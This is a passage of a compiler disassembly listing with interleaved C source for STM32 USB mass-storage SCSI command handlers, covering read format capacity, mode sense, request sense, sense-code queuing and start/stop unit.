  uint32_t blk_nbr;
  uint16_t i;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009f22:	68fb      	ldr	r3, [r7, #12]
 8009f24:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009f28:	68fb      	ldr	r3, [r7, #12]
 8009f2a:	32b0      	adds	r2, #176	; 0xb0
 8009f2c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009f30:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009f32:	69bb      	ldr	r3, [r7, #24]
 8009f34:	2b00      	cmp	r3, #0
 8009f36:	d102      	bne.n	8009f3e <SCSI_ReadFormatCapacity+0x2a>
  {
    return -1;
 8009f38:	f04f 33ff 	mov.w	r3, #4294967295
 8009f3c:	e063      	b.n	800a006 <SCSI_ReadFormatCapacity+0xf2>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &blk_nbr, &blk_size);
 8009f3e:	68fb      	ldr	r3, [r7, #12]
 8009f40:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009f44:	68fa      	ldr	r2, [r7, #12]
 8009f46:	33b0      	adds	r3, #176	; 0xb0
 8009f48:	009b      	lsls	r3, r3, #2
 8009f4a:	4413      	add	r3, r2
 8009f4c:	685b      	ldr	r3, [r3, #4]
 8009f4e:	685b      	ldr	r3, [r3, #4]
 8009f50:	f107 0214 	add.w	r2, r7, #20
 8009f54:	f107 0110 	add.w	r1, r7, #16
 8009f58:	7af8      	ldrb	r0, [r7, #11]
 8009f5a:	4798      	blx	r3
 8009f5c:	4603      	mov	r3, r0
 8009f5e:	75fb      	strb	r3, [r7, #23]

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009f60:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009f64:	2b00      	cmp	r3, #0
 8009f66:	d106      	bne.n	8009f76 <SCSI_ReadFormatCapacity+0x62>
 8009f68:	69bb      	ldr	r3, [r7, #24]
 8009f6a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f6e:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009f72:	2b02      	cmp	r3, #2
 8009f74:	d108      	bne.n	8009f88 <SCSI_ReadFormatCapacity+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009f76:	7af9      	ldrb	r1, [r7, #11]
 8009f78:	233a      	movs	r3, #58	; 0x3a
 8009f7a:	2202      	movs	r2, #2
 8009f7c:	68f8      	ldr	r0, [r7, #12]
 8009f7e:	f000 f941 	bl	800a204 <SCSI_SenseCode>
    return -1;
 8009f82:	f04f 33ff 	mov.w	r3, #4294967295
 8009f86:	e03e      	b.n	800a006 <SCSI_ReadFormatCapacity+0xf2>
  }

  for (i = 0U; i < 12U ; i++)
 8009f88:	2300      	movs	r3, #0
 8009f8a:	83fb      	strh	r3, [r7, #30]
 8009f8c:	e007      	b.n	8009f9e <SCSI_ReadFormatCapacity+0x8a>
  {
    hmsc->bot_data[i] = 0U;
 8009f8e:	8bfb      	ldrh	r3, [r7, #30]
 8009f90:	69ba      	ldr	r2, [r7, #24]
 8009f92:	4413      	add	r3, r2
 8009f94:	2200      	movs	r2, #0
 8009f96:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < 12U ; i++)
 8009f98:	8bfb      	ldrh	r3, [r7, #30]
 8009f9a:	3301      	adds	r3, #1
 8009f9c:	83fb      	strh	r3, [r7, #30]
 8009f9e:	8bfb      	ldrh	r3, [r7, #30]
 8009fa0:	2b0b      	cmp	r3, #11
 8009fa2:	d9f4      	bls.n	8009f8e <SCSI_ReadFormatCapacity+0x7a>
  }

  hmsc->bot_data[3] = 0x08U;
 8009fa4:	69bb      	ldr	r3, [r7, #24]
 8009fa6:	2208      	movs	r2, #8
 8009fa8:	74da      	strb	r2, [r3, #19]
  hmsc->bot_data[4] = (uint8_t)((blk_nbr - 1U) >> 24);
 8009faa:	693b      	ldr	r3, [r7, #16]
 8009fac:	3b01      	subs	r3, #1
 8009fae:	0e1b      	lsrs	r3, r3, #24
 8009fb0:	b2da      	uxtb	r2, r3
 8009fb2:	69bb      	ldr	r3, [r7, #24]
 8009fb4:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((blk_nbr - 1U) >> 16);
 8009fb6:	693b      	ldr	r3, [r7, #16]
 8009fb8:	3b01      	subs	r3, #1
 8009fba:	0c1b      	lsrs	r3, r3, #16
 8009fbc:	b2da      	uxtb	r2, r3
 8009fbe:	69bb      	ldr	r3, [r7, #24]
 8009fc0:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((blk_nbr - 1U) >>  8);
 8009fc2:	693b      	ldr	r3, [r7, #16]
 8009fc4:	3b01      	subs	r3, #1
 8009fc6:	0a1b      	lsrs	r3, r3, #8
 8009fc8:	b2da      	uxtb	r2, r3
 8009fca:	69bb      	ldr	r3, [r7, #24]
 8009fcc:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(blk_nbr - 1U);
 8009fce:	693b      	ldr	r3, [r7, #16]
 8009fd0:	b2db      	uxtb	r3, r3
 8009fd2:	3b01      	subs	r3, #1
 8009fd4:	b2da      	uxtb	r2, r3
 8009fd6:	69bb      	ldr	r3, [r7, #24]
 8009fd8:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = 0x02U;
 8009fda:	69bb      	ldr	r3, [r7, #24]
 8009fdc:	2202      	movs	r2, #2
 8009fde:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(blk_size >>  16);
 8009fe0:	8abb      	ldrh	r3, [r7, #20]
 8009fe2:	141b      	asrs	r3, r3, #16
 8009fe4:	b2da      	uxtb	r2, r3
 8009fe6:	69bb      	ldr	r3, [r7, #24]
 8009fe8:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(blk_size >>  8);
 8009fea:	8abb      	ldrh	r3, [r7, #20]
 8009fec:	0a1b      	lsrs	r3, r3, #8
 8009fee:	b29b      	uxth	r3, r3
 8009ff0:	b2da      	uxtb	r2, r3
 8009ff2:	69bb      	ldr	r3, [r7, #24]
 8009ff4:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(blk_size);
 8009ff6:	8abb      	ldrh	r3, [r7, #20]
 8009ff8:	b2da      	uxtb	r2, r3
 8009ffa:	69bb      	ldr	r3, [r7, #24]
 8009ffc:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = 12U;
 8009ffe:	69bb      	ldr	r3, [r7, #24]
 800a000:	220c      	movs	r2, #12
 800a002:	60da      	str	r2, [r3, #12]

  return 0;
 800a004:	2300      	movs	r3, #0
}
 800a006:	4618      	mov	r0, r3
 800a008:	3720      	adds	r7, #32
 800a00a:	46bd      	mov	sp, r7
 800a00c:	bd80      	pop	{r7, pc}
	...

0800a010 <SCSI_ModeSense6>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense6(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a010:	b580      	push	{r7, lr}
 800a012:	b086      	sub	sp, #24
 800a014:	af00      	add	r7, sp, #0
 800a016:	60f8      	str	r0, [r7, #12]
 800a018:	460b      	mov	r3, r1
 800a01a:	607a      	str	r2, [r7, #4]
 800a01c:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a01e:	68fb      	ldr	r3, [r7, #12]
 800a020:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a024:	68fb      	ldr	r3, [r7, #12]
 800a026:	32b0      	adds	r2, #176	; 0xb0
 800a028:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a02c:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE6_LEN;
 800a02e:	2317      	movs	r3, #23
 800a030:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a032:	693b      	ldr	r3, [r7, #16]
 800a034:	2b00      	cmp	r3, #0
 800a036:	d102      	bne.n	800a03e <SCSI_ModeSense6+0x2e>
  {
    return -1;
 800a038:	f04f 33ff 	mov.w	r3, #4294967295
 800a03c:	e011      	b.n	800a062 <SCSI_ModeSense6+0x52>
  }

  if (params[4] <= len)
 800a03e:	687b      	ldr	r3, [r7, #4]
 800a040:	3304      	adds	r3, #4
 800a042:	781b      	ldrb	r3, [r3, #0]
 800a044:	b29b      	uxth	r3, r3
 800a046:	8afa      	ldrh	r2, [r7, #22]
 800a048:	429a      	cmp	r2, r3
 800a04a:	d303      	bcc.n	800a054 <SCSI_ModeSense6+0x44>
  {
    len = params[4];
 800a04c:	687b      	ldr	r3, [r7, #4]
 800a04e:	3304      	adds	r3, #4
 800a050:	781b      	ldrb	r3, [r3, #0]
 800a052:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense6_data, len);
 800a054:	8afb      	ldrh	r3, [r7, #22]
 800a056:	461a      	mov	r2, r3
 800a058:	4904      	ldr	r1, [pc, #16]	; (800a06c <SCSI_ModeSense6+0x5c>)
 800a05a:	6938      	ldr	r0, [r7, #16]
 800a05c:	f000 feb8 	bl	800add0 <SCSI_UpdateBotData>

  return 0;
 800a060:	2300      	movs	r3, #0
}
 800a062:	4618      	mov	r0, r3
 800a064:	3718      	adds	r7, #24
 800a066:	46bd      	mov	sp, r7
 800a068:	bd80      	pop	{r7, pc}
 800a06a:	bf00      	nop
 800a06c:	2000011c 	.word	0x2000011c

0800a070 <SCSI_ModeSense10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a070:	b580      	push	{r7, lr}
 800a072:	b086      	sub	sp, #24
 800a074:	af00      	add	r7, sp, #0
 800a076:	60f8      	str	r0, [r7, #12]
 800a078:	460b      	mov	r3, r1
 800a07a:	607a      	str	r2, [r7, #4]
 800a07c:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a07e:	68fb      	ldr	r3, [r7, #12]
 800a080:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a084:	68fb      	ldr	r3, [r7, #12]
 800a086:	32b0      	adds	r2, #176	; 0xb0
 800a088:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a08c:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE10_LEN;
 800a08e:	231b      	movs	r3, #27
 800a090:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a092:	693b      	ldr	r3, [r7, #16]
 800a094:	2b00      	cmp	r3, #0
 800a096:	d102      	bne.n	800a09e <SCSI_ModeSense10+0x2e>
  {
    return -1;
 800a098:	f04f 33ff 	mov.w	r3, #4294967295
 800a09c:	e011      	b.n	800a0c2 <SCSI_ModeSense10+0x52>
  }

  if (params[8] <= len)
 800a09e:	687b      	ldr	r3, [r7, #4]
 800a0a0:	3308      	adds	r3, #8
 800a0a2:	781b      	ldrb	r3, [r3, #0]
 800a0a4:	b29b      	uxth	r3, r3
 800a0a6:	8afa      	ldrh	r2, [r7, #22]
 800a0a8:	429a      	cmp	r2, r3
 800a0aa:	d303      	bcc.n	800a0b4 <SCSI_ModeSense10+0x44>
  {
    len = params[8];
 800a0ac:	687b      	ldr	r3, [r7, #4]
 800a0ae:	3308      	adds	r3, #8
 800a0b0:	781b      	ldrb	r3, [r3, #0]
 800a0b2:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense10_data, len);
 800a0b4:	8afb      	ldrh	r3, [r7, #22]
 800a0b6:	461a      	mov	r2, r3
 800a0b8:	4904      	ldr	r1, [pc, #16]	; (800a0cc <SCSI_ModeSense10+0x5c>)
 800a0ba:	6938      	ldr	r0, [r7, #16]
 800a0bc:	f000 fe88 	bl	800add0 <SCSI_UpdateBotData>

  return 0;
 800a0c0:	2300      	movs	r3, #0
}
 800a0c2:	4618      	mov	r0, r3
 800a0c4:	3718      	adds	r7, #24
 800a0c6:	46bd      	mov	sp, r7
 800a0c8:	bd80      	pop	{r7, pc}
 800a0ca:	bf00      	nop
 800a0cc:	20000134 	.word	0x20000134

0800a0d0 <SCSI_RequestSense>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_RequestSense(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a0d0:	b580      	push	{r7, lr}
 800a0d2:	b086      	sub	sp, #24
 800a0d4:	af00      	add	r7, sp, #0
 800a0d6:	60f8      	str	r0, [r7, #12]
 800a0d8:	460b      	mov	r3, r1
 800a0da:	607a      	str	r2, [r7, #4]
 800a0dc:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  uint8_t i;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a0de:	68fb      	ldr	r3, [r7, #12]
 800a0e0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a0e4:	68fb      	ldr	r3, [r7, #12]
 800a0e6:	32b0      	adds	r2, #176	; 0xb0
 800a0e8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a0ec:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 800a0ee:	693b      	ldr	r3, [r7, #16]
 800a0f0:	2b00      	cmp	r3, #0
 800a0f2:	d102      	bne.n	800a0fa <SCSI_RequestSense+0x2a>
  {
    return -1;
 800a0f4:	f04f 33ff 	mov.w	r3, #4294967295
 800a0f8:	e080      	b.n	800a1fc <SCSI_RequestSense+0x12c>
  }

  if (hmsc->cbw.dDataLength == 0U)
 800a0fa:	693b      	ldr	r3, [r7, #16]
 800a0fc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a100:	699b      	ldr	r3, [r3, #24]
 800a102:	2b00      	cmp	r3, #0
 800a104:	d10b      	bne.n	800a11e <SCSI_RequestSense+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a106:	693b      	ldr	r3, [r7, #16]
 800a108:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a10c:	7f59      	ldrb	r1, [r3, #29]
 800a10e:	2320      	movs	r3, #32
 800a110:	2205      	movs	r2, #5
 800a112:	68f8      	ldr	r0, [r7, #12]
 800a114:	f000 f876 	bl	800a204 <SCSI_SenseCode>
    return -1;
 800a118:	f04f 33ff 	mov.w	r3, #4294967295
 800a11c:	e06e      	b.n	800a1fc <SCSI_RequestSense+0x12c>
  }

  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a11e:	2300      	movs	r3, #0
 800a120:	75fb      	strb	r3, [r7, #23]
 800a122:	e007      	b.n	800a134 <SCSI_RequestSense+0x64>
  {
    hmsc->bot_data[i] = 0U;
 800a124:	7dfb      	ldrb	r3, [r7, #23]
 800a126:	693a      	ldr	r2, [r7, #16]
 800a128:	4413      	add	r3, r2
 800a12a:	2200      	movs	r2, #0
 800a12c:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a12e:	7dfb      	ldrb	r3, [r7, #23]
 800a130:	3301      	adds	r3, #1
 800a132:	75fb      	strb	r3, [r7, #23]
 800a134:	7dfb      	ldrb	r3, [r7, #23]
 800a136:	2b11      	cmp	r3, #17
 800a138:	d9f4      	bls.n	800a124 <SCSI_RequestSense+0x54>
  }

  hmsc->bot_data[0] = 0x70U;
 800a13a:	693b      	ldr	r3, [r7, #16]
 800a13c:	2270      	movs	r2, #112	; 0x70
 800a13e:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[7] = REQUEST_SENSE_DATA_LEN - 6U;
 800a140:	693b      	ldr	r3, [r7, #16]
 800a142:	220c      	movs	r2, #12
 800a144:	75da      	strb	r2, [r3, #23]

  if ((hmsc->scsi_sense_head != hmsc->scsi_sense_tail))
 800a146:	693b      	ldr	r3, [r7, #16]
 800a148:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a14c:	f893 2060 	ldrb.w	r2, [r3, #96]	; 0x60
 800a150:	693b      	ldr	r3, [r7, #16]
 800a152:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a156:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a15a:	429a      	cmp	r2, r3
 800a15c:	d03f      	beq.n	800a1de <SCSI_RequestSense+0x10e>
  {
    hmsc->bot_data[2] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].Skey;
 800a15e:	693b      	ldr	r3, [r7, #16]
 800a160:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a164:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a168:	461a      	mov	r2, r3
 800a16a:	693b      	ldr	r3, [r7, #16]
 800a16c:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a170:	f813 2032 	ldrb.w	r2, [r3, r2, lsl #3]
 800a174:	693b      	ldr	r3, [r7, #16]
 800a176:	749a      	strb	r2, [r3, #18]
    hmsc->bot_data[12] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASC;
 800a178:	693b      	ldr	r3, [r7, #16]
 800a17a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a17e:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a182:	693a      	ldr	r2, [r7, #16]
 800a184:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a188:	00db      	lsls	r3, r3, #3
 800a18a:	4413      	add	r3, r2
 800a18c:	791a      	ldrb	r2, [r3, #4]
 800a18e:	693b      	ldr	r3, [r7, #16]
 800a190:	771a      	strb	r2, [r3, #28]
    hmsc->bot_data[13] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASCQ;
 800a192:	693b      	ldr	r3, [r7, #16]
 800a194:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a198:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a19c:	693a      	ldr	r2, [r7, #16]
 800a19e:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a1a2:	00db      	lsls	r3, r3, #3
 800a1a4:	4413      	add	r3, r2
 800a1a6:	795a      	ldrb	r2, [r3, #5]
 800a1a8:	693b      	ldr	r3, [r7, #16]
 800a1aa:	775a      	strb	r2, [r3, #29]
    hmsc->scsi_sense_head++;
 800a1ac:	693b      	ldr	r3, [r7, #16]
 800a1ae:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1b2:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a1b6:	3301      	adds	r3, #1
 800a1b8:	b2da      	uxtb	r2, r3
 800a1ba:	693b      	ldr	r3, [r7, #16]
 800a1bc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1c0:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60

    if (hmsc->scsi_sense_head == SENSE_LIST_DEEPTH)
 800a1c4:	693b      	ldr	r3, [r7, #16]
 800a1c6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1ca:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a1ce:	2b04      	cmp	r3, #4
 800a1d0:	d105      	bne.n	800a1de <SCSI_RequestSense+0x10e>
    {
      hmsc->scsi_sense_head = 0U;
 800a1d2:	693b      	ldr	r3, [r7, #16]
 800a1d4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1d8:	2200      	movs	r2, #0
 800a1da:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
    }
  }

  hmsc->bot_data_length = REQUEST_SENSE_DATA_LEN;
 800a1de:	693b      	ldr	r3, [r7, #16]
 800a1e0:	2212      	movs	r2, #18
 800a1e2:	60da      	str	r2, [r3, #12]

  if (params[4] <= REQUEST_SENSE_DATA_LEN)
 800a1e4:	687b      	ldr	r3, [r7, #4]
 800a1e6:	3304      	adds	r3, #4
 800a1e8:	781b      	ldrb	r3, [r3, #0]
 800a1ea:	2b12      	cmp	r3, #18
 800a1ec:	d805      	bhi.n	800a1fa <SCSI_RequestSense+0x12a>
  {
    hmsc->bot_data_length = params[4];
 800a1ee:	687b      	ldr	r3, [r7, #4]
 800a1f0:	3304      	adds	r3, #4
 800a1f2:	781b      	ldrb	r3, [r3, #0]
 800a1f4:	461a      	mov	r2, r3
 800a1f6:	693b      	ldr	r3, [r7, #16]
 800a1f8:	60da      	str	r2, [r3, #12]
  }

  return 0;
 800a1fa:	2300      	movs	r3, #0
}
 800a1fc:	4618      	mov	r0, r3
 800a1fe:	3718      	adds	r7, #24
 800a200:	46bd      	mov	sp, r7
 800a202:	bd80      	pop	{r7, pc}

0800a204 <SCSI_SenseCode>:
  * @param  ASC: Additional Sense Code
  * @retval none

  */
void SCSI_SenseCode(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t sKey, uint8_t ASC)
{
 800a204:	b480      	push	{r7}
 800a206:	b085      	sub	sp, #20
 800a208:	af00      	add	r7, sp, #0
 800a20a:	6078      	str	r0, [r7, #4]
 800a20c:	4608      	mov	r0, r1
 800a20e:	4611      	mov	r1, r2
 800a210:	461a      	mov	r2, r3
 800a212:	4603      	mov	r3, r0
 800a214:	70fb      	strb	r3, [r7, #3]
 800a216:	460b      	mov	r3, r1
 800a218:	70bb      	strb	r3, [r7, #2]
 800a21a:	4613      	mov	r3, r2
 800a21c:	707b      	strb	r3, [r7, #1]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a21e:	687b      	ldr	r3, [r7, #4]
 800a220:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a224:	687b      	ldr	r3, [r7, #4]
 800a226:	32b0      	adds	r2, #176	; 0xb0
 800a228:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a22c:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 800a22e:	68fb      	ldr	r3, [r7, #12]
 800a230:	2b00      	cmp	r3, #0
 800a232:	d03d      	beq.n	800a2b0 <SCSI_SenseCode+0xac>
  {
    return;
  }

  hmsc->scsi_sense[hmsc->scsi_sense_tail].Skey = sKey;
 800a234:	68fb      	ldr	r3, [r7, #12]
 800a236:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a23a:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a23e:	461a      	mov	r2, r3
 800a240:	68fb      	ldr	r3, [r7, #12]
 800a242:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a246:	78b9      	ldrb	r1, [r7, #2]
 800a248:	f803 1032 	strb.w	r1, [r3, r2, lsl #3]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASC = ASC;
 800a24c:	68fb      	ldr	r3, [r7, #12]
 800a24e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a252:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a256:	68fa      	ldr	r2, [r7, #12]
 800a258:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a25c:	00db      	lsls	r3, r3, #3
 800a25e:	4413      	add	r3, r2
 800a260:	787a      	ldrb	r2, [r7, #1]
 800a262:	711a      	strb	r2, [r3, #4]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASCQ = 0U;
 800a264:	68fb      	ldr	r3, [r7, #12]
 800a266:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a26a:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a26e:	68fa      	ldr	r2, [r7, #12]
 800a270:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a274:	00db      	lsls	r3, r3, #3
 800a276:	4413      	add	r3, r2
 800a278:	2200      	movs	r2, #0
 800a27a:	715a      	strb	r2, [r3, #5]
  hmsc->scsi_sense_tail++;
 800a27c:	68fb      	ldr	r3, [r7, #12]
 800a27e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a282:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a286:	3301      	adds	r3, #1
 800a288:	b2da      	uxtb	r2, r3
 800a28a:	68fb      	ldr	r3, [r7, #12]
 800a28c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a290:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61

  if (hmsc->scsi_sense_tail == SENSE_LIST_DEEPTH)
 800a294:	68fb      	ldr	r3, [r7, #12]
 800a296:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a29a:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a29e:	2b04      	cmp	r3, #4
 800a2a0:	d107      	bne.n	800a2b2 <SCSI_SenseCode+0xae>
  {
    hmsc->scsi_sense_tail = 0U;
 800a2a2:	68fb      	ldr	r3, [r7, #12]
 800a2a4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2a8:	2200      	movs	r2, #0
 800a2aa:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
 800a2ae:	e000      	b.n	800a2b2 <SCSI_SenseCode+0xae>
    return;
 800a2b0:	bf00      	nop
  }
}
 800a2b2:	3714      	adds	r7, #20
 800a2b4:	46bd      	mov	sp, r7
 800a2b6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a2ba:	4770      	bx	lr

0800a2bc <SCSI_StartStopUnit>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_StartStopUnit(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a2bc:	b580      	push	{r7, lr}
 800a2be:	b086      	sub	sp, #24
 800a2c0:	af00      	add	r7, sp, #0
 800a2c2:	60f8      	str	r0, [r7, #12]
 800a2c4:	460b      	mov	r3, r1
 800a2c6:	607a      	str	r2, [r7, #4]
 800a2c8:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a2ca:	68fb      	ldr	r3, [r7, #12]
 800a2cc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a2d0:	68fb      	ldr	r3, [r7, #12]
 800a2d2:	32b0      	adds	r2, #176	; 0xb0
 800a2d4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a2d8:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a2da:	697b      	ldr	r3, [r7, #20]
 800a2dc:	2b00      	cmp	r3, #0
 800a2de:	d102      	bne.n	800a2e6 <SCSI_StartStopUnit+0x2a>
  {
    return -1;
 800a2e0:	f04f 33ff 	mov.w	r3, #4294967295
 800a2e4:	e043      	b.n	800a36e <SCSI_StartStopUnit+0xb2>
  }

  if ((hmsc->scsi_medium_state == SCSI_MEDIUM_LOCKED) && ((params[4] & 0x3U) == 2U))
 800a2e6:	697b      	ldr	r3, [r7, #20]
 800a2e8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2ec:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a2f0:	2b01      	cmp	r3, #1
 800a2f2:	d10f      	bne.n	800a314 <SCSI_StartStopUnit+0x58>
 800a2f4:	687b      	ldr	r3, [r7, #4]
 800a2f6:	3304      	adds	r3, #4
 800a2f8:	781b      	ldrb	r3, [r3, #0]
 800a2fa:	f003 0303 	and.w	r3, r3, #3
 800a2fe:	2b02      	cmp	r3, #2
 800a300:	d108      	bne.n	800a314 <SCSI_StartStopUnit+0x58>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800a302:	7af9      	ldrb	r1, [r7, #11]
 800a304:	2324      	movs	r3, #36	; 0x24
 800a306:	2205      	movs	r2, #5
 800a308:	68f8      	ldr	r0, [r7, #12]
 800a30a:	f7ff ff7b 	bl	800a204 <SCSI_SenseCode>

    return -1;
 800a30e:	f04f 33ff 	mov.w	r3, #4294967295
 800a312:	e02c      	b.n	800a36e <SCSI_StartStopUnit+0xb2>
  }

  if ((params[4] & 0x3U) == 0x1U) /* START=1 */
 800a314:	687b      	ldr	r3, [r7, #4]
 800a316:	3304      	adds	r3, #4
 800a318:	781b      	ldrb	r3, [r3, #0]
 800a31a:	f003 0303 	and.w	r3, r3, #3
 800a31e:	2b01      	cmp	r3, #1
 800a320:	d106      	bne.n	800a330 <SCSI_StartStopUnit+0x74>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a322:	697b      	ldr	r3, [r7, #20]
 800a324:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a328:	2200      	movs	r2, #0
 800a32a:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a32e:	e01a      	b.n	800a366 <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x2U) /* START=0 and LOEJ Load Eject=1 */
 800a330:	687b      	ldr	r3, [r7, #4]
